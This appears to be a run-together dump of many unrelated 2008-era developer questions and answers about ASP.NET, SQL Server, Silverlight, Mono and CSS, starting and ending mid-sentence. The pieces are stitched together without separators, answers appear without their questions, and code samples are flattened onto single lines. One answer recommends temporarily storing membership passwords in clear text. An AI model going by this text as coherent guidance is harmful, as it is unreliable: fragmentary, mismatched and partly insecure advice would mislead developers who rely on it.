in my experience, handles just about anything - including a power cycle or hardware failure - without database corruption, and if something gets messed up it fixes it automatically.This has been my experience, and I'd be happy to hear that this has been fixed or we were doing something wrong.http://dev.mysql.com/doc/refman/6.0/en/corrupted-myisam-tables.htmlhttp://www.google.com/search?q=site%3Abugs.mysql.com+index+corruption Take a look at Data Dictionary Creator, an open source tool I wrote to make it easier to edit extended properties. It includes the ability to export the information in a variety of formats, as well.http://www.codeplex.com/datadictionary I usually use CoreyN's solution for simple cases like that. Anything more complex, use a LINQ query. It has pretty extensive coverage up to .NET 4.0 and even include some features from .NET 4.5 APIs, but there are a few areas that we have chosen not to implement due to the APIs being deprecated, new alternatives being created or the scope being too large. The following APIs are not available in Mono:Windows Presentation FoundationWindows Workflow Foundation (neither of the two versions)Entity FrameworkThe WSE1/WSE2 "add-ons" to the standard Web Services stackAdditionally, our WCF implementation is limited to what Silverlight supported.The easiest way to check for your specific project is to run the Mono Migration Analyzer (MoMA). The benefit is that it will notify the Mono team of issues which will prevent you from using Mono (if any), which lets them prioritize their work.I recently ran MoMA on SubSonic and found only one issue - a weird use of Nullable types. That's a big codebase, so the coverage there was pretty impressive.Mono is in active use in several commercial as well as open source products. It's in use in some large applications, such as Wikipedia and the Mozilla Developer Center, and has been used in embedded applications such as the Sansa MP3 players and powers thousands of published games.At the language level, the Mono compiler is fully compliant with the C# 5.0 language specification. You can use Thunderbird to access Exchange e-mail and contact lists.Edit - Oops, this uses IMAP, didn't answer the question. Tail for Win32Apache Chainsaw - used this with log4net logs, may require file to be in a certain format No, you can't. It's set up so it only works on localhost, and I couldn't find any workarounds to make it work.But, here's what I've been doing - I created the website on a specific port in IIS and opened that port up so it's visible on the network. I pointed that IIS website to my website's root folder (the one with web.config in it). Then I continued to use the ASP.NET Development server on that local machine while developing - both IIS and the ASP.NET Development Server can access the files at the same time (unless you're doing something wacky).Let me know if there's a challenge with running IIS on your machine and I'll update my answer. There's a good article on removing duplicates on the Microsoft Support site. It's pretty conservative - they have you do everything in separate steps - but it should work well against large tables.I've used self-joins to do this in the past, although it could probably be prettied up with a HAVING clause:DELETE dupesFROM MyTable dupes, MyTable fullTableWHERE dupes.dupField = fullTable.dupField AND dupes.secondDupField = fullTable.secondDupField AND dupes.uniqueField &gt; fullTable.uniqueField You didn't say which server you're using. In older versions of SQL Server, you can use this:select top 1 * from mytable order by newid()In SQL Server 2005 and up, you can use TABLESAMPLE to get a random sample that's repeatable:SELECT FirstName, LastNameFROM Contact TABLESAMPLE (1 ROWS) ; I think you're talking about:&lt;input id="info" type="image"&gt;When submitted, there are form values for the x and y coordinate based on the input element id (info.x and info.y in this case).http://www.w3.org/TR/REC-html40/interact/forms.html#h-17.4.1 I generally use a manual process:Look at the page, figure out the semantic elements, and build the HTMLSlice up the images I think I'll needStart writing CSSTweak and repeat different steps as necessaryGot a better approach, or a tool? Now that I see Jeremy's answer, I think I remember hearing that the best practice is to use a new DataContext for each data operation. Rob Conery's written several posts about DataContext, and he always news them up rather than using a singleton.http://blog.wekeroad.com/2007/08/17/linqtosql-ranch-dressing-for-your-database-pizza/http://blog.wekeroad.com/mvc-storefront/mvcstore-part-9/ (see comments)Here's the pattern we used for Video.Show (link to source view in CodePlex):using System.Configuration;namespace VideoShow.Data{ public class DataContextFactory { public static VideoShowDataContext DataContext() { return new VideoShowDataContext(ConfigurationManager.ConnectionStrings["VideoShowConnectionString"].ConnectionString); } public static VideoShowDataContext DataContext(string connectionString) { return new VideoShowDataContext(connectionString); } }}Then at the service level (or even more granular, for updates):private VideoShowDataContext dataContext = DataContextFactory.DataContext();public VideoSearchResult GetVideos(int pageSize, int pageNumber, string sortType){ var videos = from video in DataContext.Videos where video.StatusId == (int)VideoServices.VideoStatus.Complete orderby video.DatePublished descending select video; return GetSearchResult(videos, pageSize, pageNumber);} I think you should look at Silverlight as a long-term play, just as Microsoft seems to be doing. There's an obvious balance on when to use Silverlight vs. Flash when you're concerned about reach and install base, but here are some reasons Silverlight is a good direction to move in:Second mover advantage - Just as Microsoft built a "better Java" with .NET, they're able to look at how you'd design a RIA plugin from scratch, today. They have the advantage of knowing how people use the web today, something the inventors of Flash could never have accurately guessed. Flash can add features, but they can't realistically chuck the platform and start over.Developer familiarity - While Silverlight is a new model, it's not entirely unfamiliar to developers. They'll "get" the way Silverlight works a lot more quickly than they'll understand firing up a new development environment with a new scripting language and new event paradigms.Being rid of the timeline model in Flash - Flash was originally built for keyframe based animations, and while there are ways to abstract this away, it's at the core of how Flash works. Silverlight ditches that for an application-centric model. ScottGu - ScottGu is fired up about Silverlight. Nuff said.Cool new features - While Silverlight still has some catching up to do with Flash on some obvious features (like webcam / mic integration, or 3d / graphics acceleration), there are some slick new technologies built in to Silverlight - Deep Zoom is one example. I'm seeing more "revolutionary" technologies on the Silverlight side, while Flash seems to be in maintenance mode at this point. Check out osflash.org - a community based on open source Flash development. IISReset restarts the entire webserver (including all associated sites). If you're just looking to reset a single ASP.NET website, you should just recycle that AppDomain.The most common way to reset an ASP.NET website is to edit the web.config file, but you can also create an admin page with the following:public partial class Recycle : System.Web.UI.Page{ protected void Page_Load(object sender, EventArgs e) { HttpRuntime.UnloadAppDomain(); }}Here's a blog post I wrote with more info: Avoid IISRESET in ASP.NET Applications I recommend Damien Guard's "Humane theme" for Visual Studio. It includes a custom font he developed, Envy R, which uses a clever hack - the bold version of the font is actually italic, so his theme italicizes comments by telling Visual Studio to bold them.Even if you don't like the colors, just grab the theme (or the Envy R font) and tweak it in. At the risk of sounding stupid, I don't believe SQL Server supports the delete / cascade syntax. I think you can configure a delete rule to do cascading deletes (http://msdn.microsoft.com/en-us/library/ms152507.aspx), but as far as I know the trick with SQL Server is to just to run your drop query once for each table you're dropping, then check it worked. The Silverlight control only has an IsVersionSupported function, which returns true / false when you give it a version number, e.g.:if(slPlugin.isVersionSupported("2.0")) { alert("I haz some flavour of Silverlight 2");You can be as specific as you want when checking the build, since the version string can include all of the following:major - the major numberminor - the minor numberbuild - the build numberrevision - the revision numberSo we can check for a specific build number as follows:if(slPlugin.isVersionSupported("2.0.30523")) { alert("I haz Silverlight 2.0.30523, but could be any revision.");Silverlight 1.0 Beta included a control.settings.version property, which was replaced with the isVersionSupported() method. The idea is that you shouldn't be programming against specific versions of Silverlight. Rather, you should be checking if the client has at least verion 1.0, or 2.0, etc.That being said, you can get the Silverlight version number in Firefox by checking the Silverlight plugin description:alert(navigator.plugins["Silverlight Plug-In"].description);Shows '2.0.30523.8' on my computer.Note that it is possible to brute force it by iterating through all released version numbers. Presumably that's what BrowserHawk does - they'll report which version of Silverlight the client has installed. Can you clarify what you mean by "LINQ"?LINQ isn't an data access technology, it's just a language feature which supports querying as a native construct. It can query any object model which supports specific interfaces (e.g. IQueryable).Many people refer to LINQ To SQL as LINQ, but that's not at all correct. Microsoft has just released LINQ To Entities with .NET 3.5 SP1. Additionally, NHibernate has a LINQ interface, so you could use LINQ and NHibernate to get at your data. I've been told that I should include PAD files with the freeware applications I distribute so hosting sites can list the information correctly and check for updates, etc.Can you give me some info on using PAD files? Here are general questions which come to mind:Is it worth the effort? Do you use PADGen or an online tool like www.padbuilder.com? Do you digitally sign yours? The idea is that designers will work in Expression Design (to design vector artwork) and Expression Blend (to build and style XAML interactions, as well as to define timeline based animations and interactions).Developers will work on the application in Visual Studio. Visual Studio includes very basic XAML editing capabilities, so developers would only be making minor edits and would mostly be focusing on the code-behind.That's the theory / product strategy side of it. In reality, if you're performing both roles, you'll end up having your project open in both Expression Blend and Visual Studio, switching back and forth between them depending on whether you're doing "designer tasks" or "developer tasks". Fortunately, Expression Blend and Visual Studio use the same project files. If you create a clustered index, it affects the way the data is physically ordered on the disk. It's better to add the index after the fact and let the database engine reorder the rows when it knows how the data is distributed.For example, let's say you needed to build a brick wall with numbered bricks so that those with the highest number are at the bottom of the wall. It would be a difficult task if you were just handed the bricks in random order, one at a time - you wouldn't know which bricks were going to turn out to be the highest numbered, and you'd have to tear the wall down and rebuild it over and over. It would be a lot easier to handle that task if you had all the bricks lined up in front of you, and could organize your work.That's how it is for the database engine - if you let it know about the whole job, it can be much more efficient than if you just feed it a row at a time. The MediaElement doesn't support rounded corners (radiusx, radiusy). Should I use a VideoBrush on a Rectangle with rounded corners? Is there method (other than trial and error) I can use to find unused image files? How about CSS declarations for ID's and Classes that don't even exist in the site?It seems like there might be a way to write a script that scans the site, profile it, and see which images and styles are never loaded. See this question for more discussion, including use of MVC. This site uses ASP.NET and the markup is pretty clean. Check out the HTML/CSS on MicrosoftPDC.com (a site I'm working on) - it uses ASP.NET webforms, but we're designing with clean markup as a priority. I think the simplest way is to use the hover.htc approach. You add the hover.htc file to your site, then reference it in your stylesheet:body { behavior:url("csshover.htc"); }If you want to keep things as clean as possible, you can use IE conditional comments so that line is only rendered users with IE6. I'm thinking of starting a wiki, probably on a low cost LAMP hosting account. I'd like the option of exporting my content later in case I want to run it on IIS/ASP.NET down the line. I know in the weblog world, there's an open standard called BlogML which will let you export your blog content to an XML based format on one site and import it into another. Is there something similar with wikis? As far as can tell, they're all looking for help. Pick one you're passionate about, contribute some patches, and if they're accepted you've found a home.Are you looking for a specific language or technology? One method is to override the ID's manually:public override string UniqueID{ get { return this.ID; }}public override string ClientID{ get { return this.ID; }}Rick Strahl wrote a blog post with some more information on that approach. You can speed it up a lot by only viewing the XML view. Tools / Options / Text Editor / XAML / Always open documents in full XAML view (check this box). Use SQL Server Management Objects (SMO) which understands GO separators. See my blog post here: http://weblogs.asp.net/jongalloway/Handling-_2200_GO_2200_-Separators-in-SQL-Scripts-2D00-the-easy-waySample code:public static void Main() { string scriptDirectory = "c:\\temp\\sqltest\\"; string sqlConnectionString = "Integrated Security=SSPI;" + "Persist Security Info=True;Initial Catalog=Northwind;Data Source=(local)"; DirectoryInfo di = new DirectoryInfo(scriptDirectory); FileInfo[] rgFiles = di.GetFiles("*.sql"); foreach (FileInfo fi in rgFiles) { FileInfo fileInfo = new FileInfo(fi.FullName); string script = fileInfo.OpenText().ReadToEnd(); using (SqlConnection connection = new SqlConnection(sqlConnectionString)) { Server server = new Server(new ServerConnection(connection)); server.ConnectionContext.ExecuteNonQuery(script); } }}If that won't work for you, see Phil Haack's library which handles that: http://haacked.com/archive/2007/11/04/a-library-for-executing-sql-scripts-with-go-separators-and.aspx The simplest way is to set a cookie via javascript and check for it on postback.However, if you're looking to minimize spam you should actually have the browser perform a simple task which requires javascript execution.

Here's the answer I gave there:select top 1 * from mytable order by newid()In SQL Server 2005 and up, you can use TABLESAMPLE to get a random sample that's repeatable:SELECT FirstName, LastName FROM Contact TABLESAMPLE (1 ROWS) ; If you're shelling out, I'd use the reg command (details below).

If you get in a spot where you want your Menu to look different from your Sitemap, here are some workarounds.If you have a dynamic site structure, you can create a custom sitemap provider. You might get to the point where it's more trouble than it's worth, but in general populating your menu from your sitemap gives you some nice features like security trimming, in which the menu options are appropriate for the logged-in user. They were saying they were getting 1.5 million downloads per day back in March 2008, and that was before the Olympics and the Democratic National Convention. So, unless my math is off, that's more than 4 people.I'd expect to see it show up as a recommended Windows update, and possible included with IE8 or something in the future. I'd use LINQ to XML if you're in .NET 3.5 or higher. I'm working on a web-based contest which is supposed to allow anonymous users to vote, but we want to prevent them from voting more than once. IP based limits can be bypassed with anonymous proxies, users can clear cookies, etc. It's possible to use a Silverlight application, which would have access to isolated storage, but users can still clear that.I don't think it's possible to do this without some joker voting himself up with a bot or something.

Note that Mono executes .NET binaries, so as long as your program features are supported by Mono, you can take an application EXE you complied on Windows and run it on Linux/Mono without recompiling. I recommend just adding your code to a new Subversion repository rather than importing from VSS. VSS has a convoluted version control model that doesn't translate well to many other systems, and just starting fresh is usually the best way to avoid taking that clutter with you.If you need to keep the history around, make your VSS repository read-only. I'm working on an ASP.NET website which targets desktop browsers. We want to enable an optional mobile view (e.g. http://m.sample.com) which will offer a few simple pages which will be mostly text. There will be not need for AJAX or even Javascript, and there's no user input - it's really just tables of text with a few links to navigate between the pages.What's the best way to set this up so it will work on Blackberry, Windows Mobile, and iPhone?Should I be looking at ASP.NET Mobile support, or just rolling my own pages?UPDATE: This was for m.microsoftpdc.com. We went with the /Mobile subfolder approach, and used Scott Hanselman's iPhone tips for viewport and other stuff. I recommend Scott Hanselman's post (previously mentioned). I've written up a post with some tips, mostly for selfish reasons - I review it every time before I give a technical presentation:Tips for a Technical PresentationIf you're using a console prompt, make sure the font is readable and that your paths are preset when possible.Take 15 minutes to install and learn to use ZoomIt, so your audience can clearly see what you're showing off. If you have to ask if they can see something, you've already failed.Probably most important is to have separate Visual Studio settings pre-configured with big, readable fonts. In many cases, stored procedures are actually slower because they're more genaralized. While stored procedures can be highly tuned, in my experience there's enough development and institutional friction that they're left in place once they work, so stored procedures often tend to return a lot of columns "just in case" - because you don't want to deploy a new stored procedure every time you change your application. An OR/M, on the other hand, only requests the columns the application is using, which cuts down on network traffic, unnecessary joins, etc. I haven't been able to get stats. I'd assume they might release some at PDC in late October. If you're building a site which needs to target a non-developer audience who won't want to install another plugin, you might want to wait for Silverlight.I have done a good amount of testing with Moonlight on Linux, and it works well for sites which use either use Silverlight 1.0 functionality (pretty much 100% supported) or which happen to use the Silverlight 2.0 bits which Moonlight currently supports. The caveat is that some websites explicitly check the user agent and won't offer content if you're not on a "supported" platform. That's poor website coding, not a fault of the Silverlight plugin. One reason that selecting specific columns is better is that it raises the probability that SQL Server can access the data from indexes rather than querying the table data. Here's a post I wrote about it: The real reason select queries are bad index coverage It's also less fragile to change, since any code that consumes the data will be getting the same data structure regardless of changes you make to the table schema in the future. It all depends on what you're doing: animation, video, calculation, etc? There are some tests that show Silverlight being faster for raw computation, while Flash's graphics engine is farther along (GPU utilization, 3D, etc.).If you're talking about load time, there are definitely things you can do in Silverlight to make your XAP file smaller than most images - the Hard Rock Memorabilia team got their XAP down under 70K, and that site browsed GB of photo data. I'm sure you can do the same in Flash.While your question is focused on performance, as others have mentioned you do have to take into account the 4.5MB install for Silverlight, since it's not widely installed yet. It looks like you've got a bunch of form items you'd like to show in a list, right? Hmm... if only those HTML spec guys had thought to include markup to handle a list of items...I'd recommend you set it up like this:&lt;form&gt; &lt;ul&gt; &lt;li&gt;&lt;label&gt;Thingy 1:&lt;/label&gt;&lt;input class="a" type="text" name="one" /&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;Thingy 1:&lt;/label&gt;&lt;input class="a" type="text" name="one" /&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/form&gt;Then the CSS gets a lot easier. If you're not executing the code in the context of a browser, why do the tests need to be written in Javascript? It's hard to understand the bigger picture of what you're trying to accomplish here. I'd look into Session State Partitioning. Good info here:http://blog.maartenballiauw.be/post/2008/01/ASPNET-Session-State-Partitioning-using-State-Server-Load-Balancing.aspx if(dateTimeA &gt; dateTimeB) Console.WriteLine("Do your own homework"); Javascript evaluation techniques like this Invisible Captcha system require the browser to evaluate Javascript before the page submission will be accepted. It falls back nicely when the user doesn't have Javascript enabled by just displaying a conventional CAPTCHA test. Honeypot techniques put an invisible decoy form at the top of the page. Users don't see it and submit the correct form, bots submit the wrong form which does nothing or bans their IP. I've developed a site with IE8 compatibility as a requirement, and it wasn't a problem as long as I tested in IE8 from the beginning. IE8's standards are very close to most other standards compliant browsers at this point.If you can't (or won't) do that, you can usually get your page or site working in IE8 with a simple meta tag:&lt;html&gt;&lt;head&gt;&lt;title&gt;Works in IE8&lt;/title&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7"/&gt;&lt;/head&gt;&lt;body&gt;Renders the same in IE8 as it did in IE7&lt;/body&gt;It doesn't always work smoothly - IE8 only notices that meta tag if it's the first tag in the head section, which conflicts with ASP.NET themes. In that case, you can fall back to using server-wide changes to write out the HTTP headers. I wrote about that here.MSDN has some more information on the ways to handle that: http://msdn.microsoft.com/en-us/library/cc817570(en-us).aspx XamlTune can convert SVG to XAML for viewing in a Silverlight control. Inkscape can trace bitmaps, and can save directly to XAML. And, it happens to be free. I've used it to trace a lot of bitmaps and it's worked really well for me. I've seen a few COM controls which wrap the Gecko rendering engine (GeckoFX, as well as the control shipped by Mozilla - mozctlx.dll). Is there a wrapper for Webkit that can be included in a .NET Winform application? I frequently start with a simple console application to try out an idea, then create a new GUI based project and copy the code in. Is there a better way? Can I convert my existing console application easily? I'm using HttpListener to allow a user to set up a proxy on a user-defined port. When I start the HttpListener, I get an exception if the application isn't running under administrator privileges in Vista.From what I've read, this is expected behavior - administrator privileges are required to start listening on a port. But I'm sure there are ways around this, as I run plenty of programs (like Skype) which listen on a port without requiring elevation to administrator.Is there a way to do this with HttpListener? If not, can I make other API calls in .NET code to set up the port? Mono 2.0 was just officially released. What single feature do you think is the most important? I have a ListBox which displays items of variable height. I want to show as many items as will fit in the available space, without showing a vertical scrollbar. Other than surgery on the ListBox item template, is there a way to only show the number of items which will fit without scrolling? This is easiest with a library like jQuery:&lt;input type="button" onClick="javascript:test_byid();" value="id='second'" /&gt;&lt;script&gt;function test_byid(){ $("#second").toggleClass("highlight");}&lt;/script&gt; There's no access to computer resources, but you can communicate with sockets. So it's possible to have your users install an application which listens on a port and communicates with a COM port.Why are you trying to communicate with a COM port? If you're looking for webcam support, take a look at Jonas's hack which uses Flash to get webcam input:http://jonas.follesoe.no/WebcamInSilverlight2MacGyverStyle.aspx I'm not sure what the specific issue is, but I can tell you that the uploads are definitely not limited to .txt files - I've uploaded 10MB WMV files without problem. Perhaps there's something with the encoding on the service side that's causing the issue? Speculating is fun. Or we could actually try a test or two...That Silverlight vs. Javascript chess sample has been updated for Silverlight 2. When I run it, C# averages 420,000 nodes per second vs. Javascript at 23,000 nodes per second. I'm running the dev branch of Google Chrome (v. 0.4.154.25). That's still almost an 18x speed advantage for Silverlight.Primes calculation shows a 3x advantage for Silverlight: calculating 1,000,000 primes in Javascript takes 3.7 seconds, in Silverlight takes 1.2 seconds. So I think that for calculation, there's still a pretty strong advantage for Silverlight, and my gut feel is that it's likely to stay that way. Both sides will continue to optimize, but there are some limits to what you can optimize in a dynamic language.Silverlight doesn't (yet) have an advantage when it comes to animation. For instance, the Bubblemark test shows Javascript running at 170 fps, and Silverlight running at 100 fps. I think we can expect to see that change when Silverlight 3 comes out, since it will include GPU support. I've seen some methods of checking if a PEFile is a .NET assembly by examining the binary structure.Is that the fastest method to test multiple files? I assume that trying to load each file (e.g. via Assembly.ReflectionOnlyLoad) file might be pretty slow since it'll be loading file type information.Note: I'm looking for a way to check files programmatically. I believe they're calculated using Taylor Series or CORDIC. Some applications which make heavy use of trig functions (games, graphics) construct trig tables when they start up so they can just look up values rather than recalculating them over and over. Please list one site which allows Flash/Silverlight access via crossdomain.xml file. Vote for your favorite sites.The goal is to build an up to date list of sites which can be directly accessed via Flash/Silverlight without a server-side proxy.  Yahoo Pipes (http://pipes.yahoo.com/pipes/) allow access to a lot of pages and feeds that don't have crossdomain.xml files. It'll access just any page which allows indexing (robots.txt). I'm seeing a lot of Javascript errors in IE8 on pages which worked fine in IE7 (and Firefox, Chrome, and Safari). I know that IE made some changes to things like Javascript security. Some of these don't give clear error messages - things like cross-domain violations can end up throwing very vague exceptions.Let's make a checklist of top offenders when we're troubleshooting IE8 Javascript errors. Please list one change to the way IE8 Javascript that would cause a Javascript error. I found a few lists here: http://social.msdn.microsoft.com/forums/en-US/iewebdevelopment/thread/772e4b07-29e1-4909-b77f-f61c503f9579/I haven't verified these, and some of them are pretty vague. .NET 3.5 SP1 allows running applications off a network share. Previous versions did not allow it. Here's what I do in ASP.NET:Split the text field on spaces to get all the wordsIterate the words looking for words that are longer than a certain amountInsert every x characters (e.g. every 25 characters.)I looked at other CSS based ways of doing this, but didn't find anything that worked cross-browser. I'd use a jQuery plugin to handle rounded corners. Here's the list of available rounded corner plugins on the jQuery site: http://plugins.jquery.com/taxonomy/term/189 You don't need MonoDevelop to build applications that run on Mono. The main feature of Mono is that it runs .NET assemblies without need for re-compilation. You can build in Visual Studio (including any of the free versions of Visual Studio Express) and run your applications under Mono without change, providing Mono supports the API's you're using.You can use the Mono Migration Analyzer (MOMA) to test your assemblies to see if Mono will support them. It inspects the MSIL code directly, so it's very quick to test them.I believe it is possible to run MonoDevelop on Win32: http://www.monodevelop.com/MonoDevelopWin32You can run MonoDevelop on Windows using AndLinux. One challenge with Silverlight controls is that when properties are bound to code, they're no longer really editable in Blend. For example, if you've got a ListView that's populated from a data feed, there are no elements visible when you edit the control in Blend.I've heard that the MVVM pattern, originated by the WPF development community, can also help with keeping Silverlight controls "blendable". I'm still wrapping my head around it, but here are some explanations:http://www.nikhilk.net/Silverlight-ViewModel-Pattern.aspxhttp://mark-dot-net.blogspot.com/2008/11/model-view-view-model-mvvm-in.htmlhttp://www.ryankeeter.com/silverlight/silverlight-mvvm-pt-1-hello-world-style/http://jonas.follesoe.no/YouCardRevisitedImplementingTheViewModelPattern.aspx One potential downside is that the pattern requires additional classes, although not necessarily more code (as shown by the second link above). Thoughts? Is there any way to render a Silverlight text to a path or graphics object at runtime? I know this can be done using the design tools, but I want to be able to do this on the fly.I've seen an example that calls a webservice which uses WPF constructs to convert a WPF FormattedText object to a PathGeometry, but those objects aren't available in Silverlight.I'm pretty sure this just isn't supported in Silverlight, but thought it was worth asking. One option would be to place just the sensitive portions of the stored procedure in a CLR stored procedure, and obfuscate that assembly using a professional obfuscation product.http://msdn.microsoft.com/en-us/library/ms131094.aspx There are multiple places in an application which call XmlWriter.Create on the same file, all accessed through the following function. When one calls while another is still writing, I get an IOException.

What's the best way to lock so we don't try to write to the file while it's being read? I'm trying to display a video feed which is provided as a server side playlist (ASX) by another party. The playlist contains some unsupported features, such as repeat:&lt;ASX VERSION="3.0"&gt; &lt;REPEAT COUNT="4"&gt; &lt;EntryRef href="http://some-ad-network.com/ad.asx" /&gt; &lt;Entry&gt; &lt;Ref href="http://video-host/content-primary-source"&gt;&lt;/Ref&gt; &lt;/Entry&gt; &lt;Entry&gt; &lt;Ref href="http://video-host/content-secondary-source"&gt;&lt;/Ref&gt; &lt;/Entry&gt; &lt;/REPEAT&gt;&lt;/ASX&gt;Silverlight 2.0 doesn't support the REPEAT element and throws an exception: REPEAT Element: This is not supported and will raise a MediaError with AG _ E _ ASX _ UNSUPPORTED _ ELEMENT.Is there a workaround? Can I pull the ASX file down via HttpWebRequest, parse it, and request the streams individually? Do you know of a library or some sample code somewhere which handles ASX file parsing? I ended up having to parse the ASX file myself and manually load the elements. Peter's suggestion is helpful if the ASX file will load, but the Silverlight ASX parser throws exceptions when it encounters most unsupported elements so you never get the chance to load from the Attributes property. Three options depending on what you need to do:For simple cases, you can just write out the HTML to a .doc file. Sample here. That's limited, though, and prompts the user to save as HTML if they make updates.If you can require Word 2007, you can generate Office Open XML, which is basically a zip file which holds XML documents. I haven't found a library that can do that, but you can get started by renaming a sample .docx file to a .zip file and looking at what's included, then generate that from PHP. Some info on that in this SO question.If you need to support Word 2003, you need to work with Word 2003's XML format. It's different than the 2007 format, but is at least forward compatible (so it'll work on 2007 as well). The simplest way is to save as a Word 2003 XML document from Word, then open the document in a text editor, then get to work writing XSLT that will convert your HTML to the correct XML. I've done it, and it worked, but it was a lot of work. There's info on the format here.None of those are all that easy, so it might be worth buying a software product that does the conversion for you.More info on this question is available in this SO question, as well. I'm working with an ASP.NET MVC site which will use a CMS controller for all pages of the site except for the home page. Here's the idea:Home controller:www.site.comwww.site.com/default.aspxCMS Controller:www.site.com/aboutwww.site.com/agenda/schedulewww.site.com/monkey/eats/spaghetti(pretty much anything else)This page lists some options on how to set up a default page routing:Leave Default.aspx unrouted and unredirected as the entry point to your application - with static links that take your users into the MVC portion of the app (or other static content). Redirect Default.aspx in the code behind, either using the Page_Load event handler code, or use Response.Redirect("~/home") to send them to the Home controller (although this is a round-trip redirect). Rename or delete Default.aspx. Despite the warning in the markup that says that default.aspx is required to ensure that ASP.NET MVC is activated by IIS when a user makes a "/" request... it's not actually needed in either the VS dev server, or IIS7. The default request will remain an application root request "/" and will be caught by the default route and sent to the home controller.I guess one other option is to just use one controller with some logic that detects the home page case, but that seems to be fighting the concept.How do you recommend setting up a specific route for the site home page? Add a new Silverlight application to your existing solution. Here's an MSDN article which shows how to integrate it with your existing website, so building the Silverlight application will deploy the Silverlight control to your ASP.NET website's Client_Bin folder. To add a Silverlight control to a webpage in your site, you can reference the Silverlight test page that's automatically created for you, or you can use the ASP:Silverlight control, which will take care of loading the Silverlight object. It sounds like this isn't supported: http://forums.asp.net/t/1087548.aspx More info about layering HTML elements on top of or underneath your Silverlight control here: http://weblogs.asp.net/jgalloway/archive/2008/02/15/using-windowless-silverlight-controls-to-blend-html-and-silverlight-elements.aspxNote that there are performance impacts in using windowless and/or transparent controls since it requires more frequent redrawing, so it's not recommended for animation or video playback. Right-click the region where the Silverlight control should be to see if you get a Silverlight options prompt. That will tell you if the problem is in the loading of your Silverlight object into the page, or after the Silverlight plugin has loaded. Have you looked at using Deep Zoom? It's very efficient about progressive image loading, and gives you a nicer user experience when the images are fully loaded.Examples: Hard Rock Memorabilia siteDeep Zoom Pix If the computers are running Windows, I'd look at using PNRP. I'd use a MultiScaleTileSource for that. It's a callback based system - it requests Deep Zoom tiles from a function you implement when the user zooms or pans.Here's some sample code, and here's a full working example that pulls map tiles dynamically from Virtual Earth. Browsers limit you to two simultaneous requests. You might want to use a queue manager, like this:http://www.protofunc.com/scripts/jquery/ajaxManager/ It sounds like you're setting the DataContext of the UserControl right before the animation. Presumably you have binding going on, which is creating visual objects and adding them to the visual tree at the same time the animation is supposed to start. This requires processing that the animation is fighting for. The way to avoid this is to have the control instantiated (with DataContext set), but hidden, so the visual object creation does not need to be performed at the time of animation. (via my co-worker Tim Lee) Use a CSS reset like the YUI CSS reset. I'd like to integrate user comments for a Facebook or Group on my website. It's simple enough to insert a Facebook Live Stream widget into a site, but it only shows comments that other users post via the widget on my site.I'm using ASP.NET MVC, but would prefer to use HTML/Javascript integration over server-side integration if possible. You can reflect through your assembly and find all classes which inherit from type System.Web.MVC.Controller. Here's some sample code that shows how you could do that:http://mvcsitemap.codeplex.com/WorkItem/View.aspx?WorkItemId=1567 Here's an excerpt from the book Jeff, Phil, and K. Scott Allen wrote:8 ASP.NET Performance Tips. It's a few years old, but most of it's pretty timeless.My checklist:Find out what's slow by testingCache what you can (application cache, output cache, etc.)Reduce page size (eliminate viewstate, compress images, use CSS instead of inline styles, etc.)Find out which external dependencies are slowing you down (worst queries, webservices, etc.).Offload processing to the client (jQuery for filtering vs. round trips to the server to server to re-query) Use ASP.NET routing rather than rewriting when possible. It's available with both MVC and Web Forms. Routing is much more flexible and does a better job in passing context to the processing code, handling postbacks, etc.You can also use the IIS7 Rewrite Module to handle rewriting at the webserver level before your ASP.NET code executes. There's some good information on how to do that here. Take a look at Corinna John's AVIFile wrapper. I used it in the AVI output plugin for Cropper. I'd use HtmlAgilityPack and the HtmlAgilitypPack.AddOns.FormProcessor for that. I'd look at Tuple implementations for .NET 3.5. Tuples will be native in .NET 4.0, so this will be forward compatible:Will a future version of .NET support tuples in C#?Using anonymous types to simulate a tuple (used quite a bit by the MVC devs) Maybe use this Querystring Builder - iterate querystrings in the Request.QueryString dictionary and build a new one using the builder (or just string-concat them)? You might be able to use the CSS zoom property - supported in IE 5.5+, Opera, and Safari 4, and Chrome Can I use: css ZoomFirefox is the only major browser that does not support Zoom (bugzilla item here) but you could use the "proprietary" -moz-transform property in Firefox 3.5.So you could use:div.zoomed { zoom: 3; -moz-transform: scale(3); -moz-transform-origin: 0 0;}  You could temporarily set the passwordFormat value for affected users to "Clear" in the aspnet_Membership table, assign them a password, and then work on getting the e-mail working.Setting the aspnet_Membership.passwordFormat value to 0 changes the format to Clear text, which means it's not encrypted. It's not secure, but will allow login. After that, you can reset the password and it'll be changed back to 2 (Encrypted). I'd test the DLL with MOMA (Mono Migration Analyzer) to see if it's using unsupported API's. One option would be to not sleep each time:if(Counter % 2 == 0) Thread.Sleep(1); UPDATE: I don't believe it's possble to do Deep Zoom completely on the client. MultiScaleTileSource.GetTileLayers requires a collection of URI's, and I don't think you have a way to intercept that on the client.However, you could use Silverlight 3's WriteableBitmap to generate content on the client. I don't know exactly what you're trying to do exacly, but Jeff Prosise wrote an example which shows zooming into a Mandelbrot Set via Writeable Bitmaps, which shows the concept.----------- original answer -------------Create a custom MultiScaleTileSource - inherit from MultiScaleTileSource and override GetTileLayers method.Samples:http://www.silverlightshow.net/items/Deep-zooming-on-the-fly.aspxDeep Earth - a deep zoom sample that pulls map tiles from Vitual Earth On simple option is to shell to the command line:copy /b *.mp3 c:\new.mp3Better would be to concatenate the streams. That's been answered here:What would be the fastest way to concatenate three files in C#? Instead of a popup window, you could use a modal overlay (like this: http://malsup.com/jquery/block/#dialog). Mono might work for you. It's an open source implementation of .NET that runs on Linux. It requires installation.You can test your ASP.NET application with MOMA (Mono Migration Analyzer) first to see if it will work. You can encrypt the config file and/or use ProtectedData. Here's my blog post on both. UPDATE: You might be a be to encrypt your app.config as part of an install step. Sample here: http://www.codeproject.com/KB/security/encryptstrings.aspx. Not great, but the best I've found so far. XInclude one document into the other? Last I looked, .NET didn't support XIncudes, but there's an open source XInclude.NET project which adds that support. ViewStateUse ViewStateEncryption. You can set that at the page level:&lt;%@ Page Language="C#" ViewStateEncryptionMode="Always" %&gt;You can also set it at the site level in web.config:&lt;system.web&gt; &lt;pages viewStateEncryptionMode="Always" /&gt;&lt;/system.web&gt;Other Control ValuesAs Andrew Hare pointed out, that doesn't cover controls which hold their values locally.Request and Response SecurityRemember that you need to secure content both ways - to and from the server. SSL would help with both of those.More background here. You could also implement a VirtualPathProvider. I've seen this done to serve files from a single zip, they could also pull from a DLL. I'd like to display a Flickr badge as alternate content when a user doesn't have Silverlight installed to 